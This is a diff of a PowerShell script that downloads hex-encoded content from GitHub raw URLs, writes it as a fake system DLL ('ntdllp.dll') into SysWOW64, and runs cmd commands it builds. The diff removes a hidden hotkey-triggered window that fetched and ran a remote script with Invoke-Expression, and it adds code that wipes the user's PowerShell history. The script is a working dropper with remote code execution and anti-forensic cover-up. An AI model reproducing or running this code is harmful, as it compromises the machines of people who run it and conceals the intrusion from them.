@@ -2,7 +2,6 @@ Add-Type -AssemblyName System.Windows.Forms
 $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
 $urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
 $urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
-$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.ps1"
 $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
 $clipText = "SteF6b2WrAgu"
 function HexToBytes {
@@ -33,6 +32,9 @@ try {
         Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
     }
 } catch {}
+do {
+    Start-Sleep -Seconds 2
+} while (Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
 try {
     $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
     $newHexContent = $responseC.Content
@@ -41,32 +43,7 @@ try {
         [IO.File]::WriteAllBytes($filePath, $newBytes)
     }
 } catch {}
-$script:continueExecution = $false
-$global:HotkeyHandler = {
-    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::J -and 
-        [System.Windows.Forms.Control]::ModifierKeys -eq ([System.Windows.Forms.Keys]::Control -bor [System.Windows.Forms.Keys]::Shift)) {
-        $script:continueExecution = $true
-    }
-}
-$form = New-Object System.Windows.Forms.Form
-$form.Size = New-Object System.Drawing.Size(100, 100)
-$form.Opacity = 0
-$form.ShowInTaskbar = $false
-$form.StartPosition = "Manual"
-$form.Location = New-Object System.Drawing.Point(-2000, -2000)
-$form.add_KeyDown($global:HotkeyHandler)
-$form.Show()
-$form.Activate()
-do {
-    Start-Sleep -Milliseconds 100
-} while (-not $script:continueExecution)
-$form.Close()
-try {
-    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing -TimeoutSec 30
-    $finalScriptContent = $responseD.Content.Trim()
-    if ($finalScriptContent) {
-        Invoke-Expression $finalScriptContent
-    }
-} catch {}
+$historyFilePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Clear-Content -Path $historyFilePath -ErrorAction SilentlyContinue
 Clear-History -ErrorAction SilentlyContinue
 exit
